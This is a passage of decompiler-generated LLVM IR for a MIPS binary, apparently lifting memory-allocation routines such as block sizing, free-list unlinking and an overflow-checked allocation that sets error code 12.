  %v0_405cb0 = load i32, i32* %a0.global-to-local, align 4
  %v1_405cb0 = icmp eq i32 %v0_405cb0, 0
  %v3_405cb0 = icmp ult i32 %v0_405cb0, -7
  %v4_405cb0 = zext i1 %v3_405cb0 to i32
  store i32 %v4_405cb0, i32* %v0.global-to-local, align 4
  br i1 %v1_405cb0, label %dec_label_pc_405cb4, label %dec_label_pc_405cc0

dec_label_pc_405cb4:                              ; preds = %dec_label_pc_405c90
  store i32 1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405cc0

dec_label_pc_405cc0:                              ; preds = %dec_label_pc_405c90, %dec_label_pc_405cb4
  %v0_405ccc = phi i32 [ %v0_405cb0, %dec_label_pc_405c90 ], [ 1, %dec_label_pc_405cb4 ]
  %v1_405cc0 = icmp eq i1 %v3_405cb0, false
  br i1 %v1_405cc0, label %dec_label_pc_405e48, label %dec_label_pc_405cc4

dec_label_pc_405cc4:                              ; preds = %dec_label_pc_405cc0
  %v1_405ccc = add i32 %v0_405ccc, 4
  store i32 %v1_405ccc, i32* %v0.global-to-local, align 4
  %v3_405cd0 = load i32, i32* bitcast (i32** @global_var_449448.319 to i32*), align 4
  store i32 %v3_405cd0, i32* %a0.global-to-local, align 4
  store i32 %v1_405ccc, i32* %stack_var_-24, align 4
  %v6_405cd4 = call i32 @function_406744(i32 %v3_405cd0)
  store i32 %v6_405cd4, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v3_405ce8 = load i32, i32* bitcast (i32*** @global_var_449430.322 to i32*), align 4
  store i32 %v3_405ce8, i32* %a0.global-to-local, align 4
  %v3_405cec = ptrtoint i32* %stack_var_-24 to i32
  %tmp11 = inttoptr i32 %v3_405ce8 to i32*
  %v8_405cec = call i32 @function_4060d0(i32* %tmp11, i32 %v3_405cec)
  store i32 %v8_405cec, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v3_405cfc = load i32, i32* @global_var_4493ec.300, align 4
  store i32 %v3_405cfc, i32* @t9, align 4
  %v3_405d00 = load i32, i32* bitcast (i32** @global_var_449448.319 to i32*), align 4
  store i32 %v3_405d00, i32* %a0.global-to-local, align 4
  store i32 %v8_405cec, i32* %s0.global-to-local, align 4
  %v3_405d04 = call i32 @function_406744(i32 %v3_405d00)
  store i32 %v3_405d04, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v1_405d10 = icmp eq i32 %v8_405cec, 0
  br i1 %v1_405d10, label %dec_label_pc_405d14, label %dec_label_pc_405e30

dec_label_pc_405d14:                              ; preds = %dec_label_pc_405cc4
  %v3_405d18 = load i32, i32* bitcast (i32** @global_var_4492f4.324 to i32*), align 4
  %v3_405d1c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_405d18, i32* @s0, align 4
  %v2_405d28 = icmp ult i32 %v3_405d1c, %v3_405d18
  store i32 ptrtoint (i32* @global_var_4492f9.325 to i32), i32* %v0.global-to-local, align 4
  br i1 %v2_405d28, label %dec_label_pc_405d40, label %dec_label_pc_405d30

dec_label_pc_405d30:                              ; preds = %dec_label_pc_405d14
  store i32 ptrtoint (i32* @global_var_4492f8 to i32), i32* %v0.global-to-local, align 4
  %v1_405d38 = sub i32 0, %v3_405d18
  %v2_405d3c = and i32 %v1_405d38, ptrtoint (i32* @global_var_4492f8 to i32)
  store i32 %v2_405d3c, i32* @s0, align 4
  br label %dec_label_pc_405d40

dec_label_pc_405d40:                              ; preds = %dec_label_pc_405d14, %dec_label_pc_405d30
  %v3_405d44 = load i32, i32* bitcast (i32** @global_var_449318.327 to i32*), align 4
  store i32 %v3_405d44, i32* %a0.global-to-local, align 4
  %v2_405d48 = call i32 @function_406744(i32 %v3_405d44)
  store i32 %v2_405d48, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v3_405d58 = load i32, i32* @global_var_449488.328, align 4
  store i32 %v3_405d58, i32* @t9, align 4
  %v1_405d60 = load i32, i32* @s0, align 4
  store i32 %v1_405d60, i32* %a0.global-to-local, align 4
  %v3_405d60 = call i32 @function_407330(i32 %v1_405d60)
  store i32 %v3_405d60, i32* @a2, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v2_405d74 = icmp eq i32 %v3_405d60, -1
  %v4_405d74 = add i32 %v3_405d60, 3
  br i1 %v2_405d74, label %dec_label_pc_405d78, label %dec_label_pc_405d84

dec_label_pc_405d78:                              ; preds = %dec_label_pc_405d40
  br label %dec_label_pc_405d84

dec_label_pc_405d84:                              ; preds = %dec_label_pc_405d40, %dec_label_pc_405d78
  store i32 -4, i32* %v0.global-to-local, align 4
  %v2_405d88 = and i32 %v4_405d74, -4
  store i32 %v2_405d88, i32* @s1, align 4
  %v2_405d8c = icmp eq i32 %v2_405d88, %v3_405d60
  br i1 %v2_405d8c, label %dec_label_pc_405dac, label %dec_label_pc_405d90

dec_label_pc_405d90:                              ; preds = %dec_label_pc_405d84
  %v3_405d94 = load i32, i32* @global_var_449488.328, align 4
  store i32 %v3_405d94, i32* @t9, align 4
  %v3_405d9c = sub i32 %v2_405d88, %v3_405d60
  store i32 %v3_405d9c, i32* %a0.global-to-local, align 4
  %v5_405d9c = call i32 @function_407330(i32 %v3_405d9c)
  store i32 %v5_405d9c, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_405dac

dec_label_pc_405dac:                              ; preds = %dec_label_pc_405d84, %dec_label_pc_405d90
  %v3_405db0 = load i32, i32* bitcast (i32** @global_var_449318.327 to i32*), align 4
  store i32 %v3_405db0, i32* %a0.global-to-local, align 4
  %v2_405db4 = call i32 @function_406744(i32 %v3_405db0)
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v0_405dc4 = load i32, i32* @s1, align 4
  %v2_405dc4 = icmp eq i32 %v0_405dc4, -1
  br i1 %v2_405dc4, label %dec_label_pc_405e48, label %dec_label_pc_405dc8

dec_label_pc_405dc8:                              ; preds = %dec_label_pc_405dac
  %v3_405dd0 = load i32, i32* bitcast (i32** @global_var_449448.319 to i32*), align 4
  store i32 %v3_405dd0, i32* %a0.global-to-local, align 4
  %v2_405dd4 = call i32 @function_406744(i32 %v3_405dd0)
  store i32 %v2_405dd4, i32* @v0, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v0_405de0 = load i32, i32* @s0, align 4
  %v3_405de4 = load i32, i32* @global_var_449470.329, align 4
  store i32 %v3_405de4, i32* @t9, align 4
  %v3_405de8 = load i32, i32* bitcast (i32*** @global_var_449430.322 to i32*), align 4
  store i32 %v3_405de8, i32* %a0.global-to-local, align 4
  %v1_405dec = load i32, i32* @s1, align 4
  %tmp12 = inttoptr i32 %v3_405de8 to i32*
  %v7_405dec = call i32 @function_4061d8(i32* %tmp12, i32 %v1_405dec, i32 %v0_405de0)
  store i32 %v7_405dec, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v3_405e00 = load i32, i32* bitcast (i32*** @global_var_449430.322 to i32*), align 4
  store i32 %v3_405e00, i32* %a0.global-to-local, align 4
  %tmp13 = inttoptr i32 %v3_405e00 to i32*
  %v8_405e04 = call i32 @function_4060d0(i32* %tmp13, i32 %v3_405cec)
  store i32 %v8_405e04, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v3_405e14 = load i32, i32* @global_var_4493ec.300, align 4
  store i32 %v3_405e14, i32* @t9, align 4
  %v3_405e18 = load i32, i32* bitcast (i32** @global_var_449448.319 to i32*), align 4
  store i32 %v3_405e18, i32* %a0.global-to-local, align 4
  store i32 %v8_405e04, i32* %s0.global-to-local, align 4
  %v3_405e1c = call i32 @function_406744(i32 %v3_405e18)
  store i32 %v3_405e1c, i32* %v0.global-to-local, align 4
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v1_405e28 = icmp eq i32 %v8_405e04, 0
  br i1 %v1_405e28, label %dec_label_pc_405e48, label %dec_label_pc_405e30

dec_label_pc_405e30:                              ; preds = %dec_label_pc_405dc8, %dec_label_pc_405cc4
  %v1_405e38 = phi i32 [ %v8_405e04, %dec_label_pc_405dc8 ], [ %v8_405cec, %dec_label_pc_405cc4 ]
  %v3_405e30 = load i32, i32* %stack_var_-24, align 4
  %v2_405e38 = inttoptr i32 %v1_405e38 to i32*
  store i32 %v3_405e30, i32* %v2_405e38, align 4
  %v0_405e3c = load i32, i32* %s0.global-to-local, align 4
  %v1_405e3c = add i32 %v0_405e3c, 4
  store i32 %v1_405e3c, i32* %s0.global-to-local, align 4
  %v1_405e40 = icmp eq i32 %v1_405e3c, 0
  store i32 %v1_405e3c, i32* %v0.global-to-local, align 4
  br i1 %v1_405e40, label %dec_label_pc_405e30.dec_label_pc_405e48_crit_edge, label %dec_label_pc_405e68

dec_label_pc_405e30.dec_label_pc_405e48_crit_edge: ; preds = %dec_label_pc_405e30
  %v0_405e48.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_405e48

dec_label_pc_405e48:                              ; preds = %dec_label_pc_405e30.dec_label_pc_405e48_crit_edge, %dec_label_pc_405dc8, %dec_label_pc_405dac, %dec_label_pc_405cc0
  %v0_405e48 = phi i32 [ %v0_405e48.pre, %dec_label_pc_405e30.dec_label_pc_405e48_crit_edge ], [ %v2_405c98, %dec_label_pc_405dc8 ], [ %v2_405c98, %dec_label_pc_405dac ], [ %v2_405c98, %dec_label_pc_405cc0 ]
  %v1_405e48 = add i32 %v0_405e48, -32496
  %v2_405e48 = inttoptr i32 %v1_405e48 to i32*
  %v3_405e48 = load i32, i32* %v2_405e48, align 4
  store i32 %v3_405e48, i32* @t9, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_405e48)
  store i32 %v2_405c98, i32* %gp.global-to-local, align 4
  %v1_405e60 = load i32, i32* %v0.global-to-local, align 4
  %v2_405e60 = inttoptr i32 %v1_405e60 to i32*
  store i32 12, i32* %v2_405e60, align 4
  %v0_405e64 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_405e64, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_405e68

dec_label_pc_405e68:                              ; preds = %dec_label_pc_405e30, %dec_label_pc_405e48
  %v4_405e74 = phi i32 [ %v1_405e3c, %dec_label_pc_405e30 ], [ %v0_405e64, %dec_label_pc_405e48 ]
  store i32 %v0_405ca4, i32* @s1, align 4
  store i32 %v0_405ca8, i32* @s0, align 4
  ret i32 %v4_405e74

; uselistorder directives
  uselistorder i32 %v8_405e04, { 1, 0, 2, 3 }
  uselistorder i32 %v2_405d88, { 1, 0, 2 }
  uselistorder i32 %v3_405d60, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v8_405cec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_405c98, { 3, 0, 1, 2, 13, 12, 11, 10, 9, 14, 8, 7, 6, 5, 4, 15 }
  uselistorder i32* %stack_var_-24, { 0, 1, 3, 2 }
  uselistorder i32* %v0.global-to-local, { 0, 15, 1, 2, 3, 4, 5, 8, 6, 7, 11, 9, 10, 12, 13, 17, 14, 16 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %gp.global-to-local, { 0, 9, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* @global_var_4492f8, { 1, 0 }
  uselistorder label %dec_label_pc_405e68, { 1, 0 }
  uselistorder label %dec_label_pc_405dac, { 1, 0 }
  uselistorder label %dec_label_pc_405d84, { 1, 0 }
  uselistorder label %dec_label_pc_405d40, { 1, 0 }
  uselistorder label %dec_label_pc_405cc0, { 1, 0 }
}

define i32 @function_405e80(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405e80:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg1 to i32
  %v3_405ea0 = sext i32 %arg2 to i64
  %v5_405ea0 = mul nsw i64 %v3_405ea0, %arg1
  %v6_405ea0 = trunc i64 %v5_405ea0 to i32
  %v3_405ea4 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v6_405ea0, i32* %s0.global-to-local, align 4
  %v2_405eac = icmp eq i32 %tmp, 0
  store i32 %v3_405ea4, i32* %v1.global-to-local, align 4
  br i1 %v2_405eac, label %dec_label_pc_405ee8, label %dec_label_pc_405eb0

dec_label_pc_405eb0:                              ; preds = %dec_label_pc_405e80
  %v6_405eb4 = udiv i32 %v6_405ea0, %tmp
  %v3_405ec0 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405ec0, i32* @t9, align 4
  store i32 %v6_405eb4, i32* @v0, align 4
  %v2_405ec8 = icmp eq i32 %v6_405eb4, %arg2
  store i32 0, i32* %s1.global-to-local, align 4
  br i1 %v2_405ec8, label %dec_label_pc_405ee8, label %dec_label_pc_405ecc

dec_label_pc_405ecc:                              ; preds = %dec_label_pc_405eb0
  %v1_405ed0 = call i32 @function_405490()
  store i32 %v1_405ed0, i32* @v0, align 4
  store i32 12, i32* %v1.global-to-local, align 4
  %v2_405ee4 = inttoptr i32 %v1_405ed0 to i32*
  store i32 12, i32* %v2_405ee4, align 4
  %v0_405ee8.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405ee8

dec_label_pc_405ee8:                              ; preds = %dec_label_pc_405eb0, %dec_label_pc_405e80, %dec_label_pc_405ecc
  %v0_405ee8 = phi i32 [ %v3_405ea4, %dec_label_pc_405eb0 ], [ %v3_405ea4, %dec_label_pc_405e80 ], [ %v0_405ee8.pre, %dec_label_pc_405ecc ]
  call void @__pseudo_call(i32 %v0_405ee8)
  %v0_405ef8 = load i32, i32* @v0, align 4
  store i32 %v0_405ef8, i32* %s1.global-to-local, align 4
  %v1_405f08 = icmp eq i32 %v0_405ef8, 0
  br i1 %v1_405f08, label %dec_label_pc_405f1c, label %dec_label_pc_405f0c

dec_label_pc_405f0c:                              ; preds = %dec_label_pc_405ee8
  %v0_405f00 = load i32, i32* %s0.global-to-local, align 4
  %v4_405f10 = inttoptr i32 %v0_405ef8 to i32*
  %v5_405f10 = call i32 @function_405520(i32* %v4_405f10, i32 0, i32 %v0_405f00)
  %v0_405f1c.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_405f1c

dec_label_pc_405f1c:                              ; preds = %dec_label_pc_405ee8, %dec_label_pc_405f0c
  %v0_405f1c = phi i32 [ 0, %dec_label_pc_405ee8 ], [ %v0_405f1c.pre, %dec_label_pc_405f0c ]
  ret i32 %v0_405f1c

; uselistorder directives
  uselistorder i32 %v0_405ef8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405f1c, { 1, 0 }
  uselistorder label %dec_label_pc_405ee8, { 2, 0, 1 }
}

define i32 @function_405f40(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f40:
  %gp.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_405f48 = load i32, i32* @t9, align 4
  %v2_405f48 = add i32 %v1_405f48, 307856
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  %v0_405f50 = load i32, i32* @ra, align 4
  %v0_405f54 = load i32, i32* @s2, align 4
  %v0_405f58 = load i32, i32* @s1, align 4
  %v0_405f5c = load i32, i32* @s0, align 4
  %v1_405f64 = icmp eq i32 %arg1, 0
  br i1 %v1_405f64, label %dec_label_pc_4060b4, label %dec_label_pc_405f68

dec_label_pc_405f68:                              ; preds = %dec_label_pc_405f40
  %v3_405f70 = load i32, i32* bitcast (i32** @global_var_449448.319 to i32*), align 4
  %v1_405f74 = add i32 %arg1, -4
  %v2_405f74 = inttoptr i32 %v1_405f74 to i32*
  %v3_405f74 = load i32, i32* %v2_405f74, align 4
  store i32 %v3_405f74, i32* @s1, align 4
  store i32 %v1_405f74, i32* @s0, align 4
  %v4_405f78 = call i32 @function_406744(i32 %v3_405f70)
  store i32 %v4_405f78, i32* @v0, align 4
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  %v3_405f88 = load i32, i32* @global_var_449470.329, align 4
  store i32 %v3_405f88, i32* @t9, align 4
  %v3_405f8c = load i32, i32* bitcast (i32*** @global_var_449430.322 to i32*), align 4
  %v0_405f90 = load i32, i32* @s0, align 4
  %v1_405f94 = load i32, i32* @s1, align 4
  %tmp9 = inttoptr i32 %v3_405f8c to i32*
  %v7_405f94 = call i32 @function_4061d8(i32* %tmp9, i32 %v0_405f90, i32 %v1_405f94)
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  %v1_405fa0 = inttoptr i32 %v7_405f94 to i32*
  %v2_405fa0 = load i32, i32* %v1_405fa0, align 4
  store i32 %v2_405fa0, i32* %s2.global-to-local, align 4
  store i32 %v7_405f94, i32* @s0, align 4
  %v3_405fa8 = load i32, i32* bitcast (i32** @global_var_4492f4.324 to i32*), align 4
  %v1_405fb8 = mul i32 %v3_405fa8, 8
  %v2_405fbc = icmp ult i32 %v2_405fa0, %v1_405fb8
  br i1 %v2_405fbc, label %dec_label_pc_406014, label %dec_label_pc_405fc4

dec_label_pc_405fc4:                              ; preds = %dec_label_pc_405f68
  %v3_405fcc = load i32, i32* bitcast (i32** @global_var_449318.327 to i32*), align 4
  %v2_405fd0 = add i32 %v7_405f94, 12
  store i32 %v2_405fd0, i32* @s1, align 4
  %v4_405fd0 = call i32 @function_406744(i32 %v3_405fcc)
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  %v3_405fe0 = load i32, i32* @global_var_449488.328, align 4
  store i32 %v3_405fe0, i32* @t9, align 4
  %v2_405fe8 = call i32 @function_407330(i32 0)
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  %v0_405ff4 = load i32, i32* @s1, align 4
  %v2_405ff4 = icmp eq i32 %v0_405ff4, %v2_405fe8
  br i1 %v2_405ff4, label %dec_label_pc_406034, label %dec_label_pc_405ff8

dec_label_pc_405ff8:                              ; preds = %dec_label_pc_405fc4
  %v3_406000 = load i32, i32* bitcast (i32** @global_var_449318.327 to i32*), align 4
  %v2_406004 = call i32 @function_406744(i32 %v3_406000)
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406014

dec_label_pc_406014:                              ; preds = %dec_label_pc_405f68, %dec_label_pc_405ff8
  %v3_406018 = load i32, i32* bitcast (i32** @global_var_449448.319 to i32*), align 4
  store i32 %v0_405f54, i32* %s2.global-to-local, align 4
  store i32 %v0_405f58, i32* @s1, align 4
  store i32 %v0_405f5c, i32* @s0, align 4
  %v5_40602c = call i32 @function_406744(i32 %v3_406018)
  br label %dec_label_pc_406034

dec_label_pc_406034:                              ; preds = %dec_label_pc_405fc4, %dec_label_pc_406014
  %v0_406034 = load i32, i32* @s0, align 4
  %v1_406034 = add i32 %v0_406034, 4
  %v2_406034 = inttoptr i32 %v1_406034 to i32*
  %v3_406034 = load i32, i32* %v2_406034, align 4
  store i32 %v3_406034, i32* %v1.global-to-local, align 4
  %v1_40603c = icmp eq i32 %v3_406034, 0
  br i1 %v1_40603c, label %dec_label_pc_406050, label %dec_label_pc_406040

dec_label_pc_406040:                              ; preds = %dec_label_pc_406034
  %v1_406044 = add i32 %v0_406034, 8
  %v2_406044 = inttoptr i32 %v1_406044 to i32*
  %v3_406044 = load i32, i32* %v2_406044, align 4
  %v2_40604c = add i32 %v3_406034, 8
  %v3_40604c = inttoptr i32 %v2_40604c to i32*
  store i32 %v3_406044, i32* %v3_40604c, align 4
  %v0_406050.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_406050

dec_label_pc_406050:                              ; preds = %dec_label_pc_406034, %dec_label_pc_406040
  %v0_406050 = phi i32 [ %v0_406034, %dec_label_pc_406034 ], [ %v0_406050.pre, %dec_label_pc_406040 ]
  %v1_406050 = add i32 %v0_406050, 8
  %v2_406050 = inttoptr i32 %v1_406050 to i32*
  %v3_406050 = load i32, i32* %v2_406050, align 4
  %v1_406054 = add i32 %v0_406050, 4
  %v2_406054 = inttoptr i32 %v1_406054 to i32*
  %v3_406054 = load i32, i32* %v2_406054, align 4
  store i32 %v3_406054, i32* %v1.global-to-local, align 4
  %v1_406058 = icmp eq i32 %v3_406050, 0
  br i1 %v1_406058, label %dec_label_pc_406068, label %dec_label_pc_40605c

dec_label_pc_40605c:                              ; preds = %dec_label_pc_406050
  %v2_406064 = add i32 %v3_406050, 4
  %v3_406064 = inttoptr i32 %v2_406064 to i32*
  store i32 %v3_406054, i32* %v3_406064, align 4
  %v0_406070.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406068

dec_label_pc_406068:                              ; preds = %dec_label_pc_406050, %dec_label_pc_40605c
  %v0_406070 = phi i32 [ %v3_406054, %dec_label_pc_406050 ], [ %v0_406070.pre, %dec_label_pc_40605c ]
  %v0_406068 = load i32, i32* %gp.global-to-local, align 4
  %v1_406068 = add i32 %v0_406068, -32160
  %v2_406068 = inttoptr i32 %v1_406068 to i32*
  %v3_406068 = load i32, i32* %v2_406068, align 4
  %v2_406070 = inttoptr i32 %v3_406068 to i32*
  store i32 %v0_406070, i32* %v2_406070, align 4
  %v0_406074 = load i32, i32* %gp.global-to-local, align 4
  %v1_406074 = add i32 %v0_406074, -32228
  %v2_406074 = inttoptr i32 %v1_406074 to i32*
  %v3_406074 = load i32, i32* %v2_406074, align 4
  call void @__pseudo_call(i32 %v3_406074)
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  %v0_406088 = load i32, i32* @s0, align 4
  %v1_406088 = load i32, i32* %s2.global-to-local, align 4
  %v3_40608c = load i32, i32* @global_var_449488.328, align 4
  store i32 %v3_40608c, i32* @t9, align 4
  %v2_406094 = load i32, i32* @s1, align 4
  %v2_406088 = add i32 %v0_406088, 12
  %v1_406090 = sub i32 %v2_406088, %v1_406088
  %v3_406094 = sub i32 %v1_406090, %v2_406094
  %v5_406094 = call i32 @function_407330(i32 %v3_406094)
  store i32 %v2_405f48, i32* %gp.global-to-local, align 4
  %v3_4060a4 = load i32, i32* @global_var_4493ec.300, align 4
  store i32 %v3_4060a4, i32* @t9, align 4
  br label %dec_label_pc_4060b4

dec_label_pc_4060b4:                              ; preds = %dec_label_pc_405f40, %dec_label_pc_406068
  %.0 = phi i32 [ undef, %dec_label_pc_405f40 ], [ %v5_406094, %dec_label_pc_406068 ]
  store i32 %v0_405f50, i32* @ra, align 4
  store i32 %v0_405f54, i32* @s2, align 4
  store i32 %v0_405f58, i32* @s1, align 4
  store i32 %v0_405f5c, i32* @s0, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_406050, { 1, 0 }
  uselistorder i32 %v0_405f5c, { 1, 0 }
  uselistorder i32 %v0_405f58, { 1, 0 }
  uselistorder i32 %v0_405f54, { 1, 0 }
  uselistorder i32 %v2_405f48, { 3, 2, 6, 5, 4, 1, 0, 7 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 5, 6, 2, 3, 4, 7, 8, 9 }
  uselistorder i32 undef, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @function_407330, { 3, 2, 1, 0 }
  uselistorder i32* @s2, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31 }
  uselistorder label %dec_label_pc_4060b4, { 1, 0 }
  uselistorder label %dec_label_pc_406068, { 1, 0 }
  uselistorder label %dec_label_pc_406050, { 1, 0 }
  uselistorder label %dec_label_pc_406034, { 1, 0 }
  uselistorder label %dec_label_pc_406014, { 1, 0 }
}

define i32 @function_4060d0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4060d0:
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_4060d0 = inttoptr i32 %arg2 to i32*
  %v2_4060d0 = load i32, i32* %v1_4060d0, align 4
  store i32 -4, i32* %v1.global-to-local, align 4
  %v1_4060d8 = add i32 %v2_4060d0, 3
  %v2_4060dc = and i32 %v1_4060d8, -4
  store i32 %v2_4060dc, i32* @a2, align 4
  %v1_4060e0 = icmp ult i32 %v2_4060dc, 12
  %v2_4060e0 = zext i1 %v1_4060e0 to i32
  store i32 %v2_4060e0, i32* %v0.global-to-local, align 4
  %v1_4060e4 = icmp eq i1 %v1_4060e0, false
  br i1 %v1_4060e4, label %dec_label_pc_4060f0, label %dec_label_pc_4060e8

dec_label_pc_4060e8:                              ; preds = %dec_label_pc_4060d0
  store i32 12, i32* @a2, align 4
  br label %dec_label_pc_4060f0

dec_label_pc_4060f0:                              ; preds = %dec_label_pc_4060d0, %dec_label_pc_4060e8
  %v3_406114 = phi i32 [ %v2_4060dc, %dec_label_pc_4060d0 ], [ 12, %dec_label_pc_4060e8 ]
  %v2_4060f0 = load i32, i32* %arg1, align 4
  store i32 %v2_4060f0, i32* %v1.global-to-local, align 4
  %v3_406108 = add i32 %v3_406114, 44
  br label %dec_label_pc_4060fc

dec_label_pc_4060fc:                              ; preds = %dec_label_pc_406174, %dec_label_pc_4060f0
  %v0_406174 = phi i32 [ %v3_406174, %dec_label_pc_406174 ], [ %v2_4060f0, %dec_label_pc_4060f0 ]
  %v1_4060fc = inttoptr i32 %v0_406174 to i32*
  %v2_4060fc = load i32, i32* %v1_4060fc, align 4
  store i32 %v2_4060fc, i32* @a3, align 4
  %v2_406104 = icmp ult i32 %v2_4060fc, %v3_406114
  store i32 %v3_406108, i32* %v0.global-to-local, align 4
  br i1 %v2_406104, label %dec_label_pc_406174, label %dec_label_pc_40610c

dec_label_pc_40610c:                              ; preds = %dec_label_pc_4060fc
  %v2_406110 = icmp ult i32 %v2_4060fc, %v3_406108
  %v1_406114 = icmp eq i1 %v2_406110, false
  %v4_406114 = sub i32 %v2_4060fc, %v3_406114
  store i32 %v4_406114, i32* %v0.global-to-local, align 4
  br i1 %v1_406114, label %dec_label_pc_406160, label %dec_label_pc_406118

dec_label_pc_406118:                              ; preds = %dec_label_pc_40610c
  %v1_40611c = add i32 %v0_406174, 4
  %v2_40611c = inttoptr i32 %v1_40611c to i32*
  %v3_40611c = load i32, i32* %v2_40611c, align 4
  %v1_406124 = icmp eq i32 %v3_40611c, 0
  br i1 %v1_406124, label %dec_label_pc_406138, label %dec_label_pc_406128

dec_label_pc_406128:                              ; preds = %dec_label_pc_406118
  %v1_40612c = add i32 %v0_406174, 8
  %v2_40612c = inttoptr i32 %v1_40612c to i32*
  %v3_40612c = load i32, i32* %v2_40612c, align 4
  store i32 %v3_40612c, i32* %v0.global-to-local, align 4
  %v2_406134 = add i32 %v3_40611c, 8
  %v3_406134 = inttoptr i32 %v2_406134 to i32*
  store i32 %v3_40612c, i32* %v3_406134, align 4
  %v0_406138.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406138

dec_label_pc_406138:                              ; preds = %dec_label_pc_406118, %dec_label_pc_406128
  %v0_406138 = phi i32 [ %v0_406174, %dec_label_pc_406118 ], [ %v0_406138.pre, %dec_label_pc_406128 ]
  %v1_406138 = add i32 %v0_406138, 8
  %v2_406138 = inttoptr i32 %v1_406138 to i32*
  %v3_406138 = load i32, i32* %v2_406138, align 4
  store i32 %v3_406138, i32* %v0.global-to-local, align 4
  %v1_40613c = add i32 %v0_406138, 4
  %v2_40613c = inttoptr i32 %v1_40613c to i32*
  %v3_40613c = load i32, i32* %v2_40613c, align 4
  store i32 %v3_40613c, i32* %t0.global-to-local, align 4
  %v1_406140 = icmp eq i32 %v3_406138, 0
  br i1 %v1_406140, label %dec_label_pc_406154, label %dec_label_pc_406144

dec_label_pc_406144:                              ; preds = %dec_label_pc_406138
  %v2_406150 = add i32 %v3_406138, 4
  %v3_406150 = inttoptr i32 %v2_406150 to i32*
  store i32 %v3_40613c, i32* %v3_406150, align 4
  %v0_40615c.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_406154

dec_label_pc_406154:                              ; preds = %dec_label_pc_406138, %dec_label_pc_406144
  %v0_40615c = phi i32 [ %v3_40613c, %dec_label_pc_406138 ], [ %v0_40615c.pre, %dec_label_pc_406144 ]
  %v0_406154 = load i32, i32* @a3, align 4
  store i32 %v0_406154, i32* @a2, align 4
  store i32 %v0_40615c, i32* %arg1, align 4
  %v0_406160.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_406160.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406160

dec_label_pc_406160:                              ; preds = %dec_label_pc_40610c, %dec_label_pc_406154
  %v1_406160 = phi i32 [ %v0_406174, %dec_label_pc_40610c ], [ %v1_406160.pre, %dec_label_pc_406154 ]
  %v0_406160 = phi i32 [ %v4_406114, %dec_label_pc_40610c ], [ %v0_406160.pre, %dec_label_pc_406154 ]
  %v2_406160 = inttoptr i32 %v1_406160 to i32*
  store i32 %v0_406160, i32* %v2_406160, align 4
  %v0_406164 = load i32, i32* %v1.global-to-local, align 4
  %v1_406164 = load i32, i32* @a3, align 4
  %v2_406164 = sub i32 %v0_406164, %v1_406164
  %v1_406168 = add i32 %v2_406164, 12
  store i32 %v1_406168, i32* %v0.global-to-local, align 4
  %v1_40616c = load i32, i32* @a2, align 4
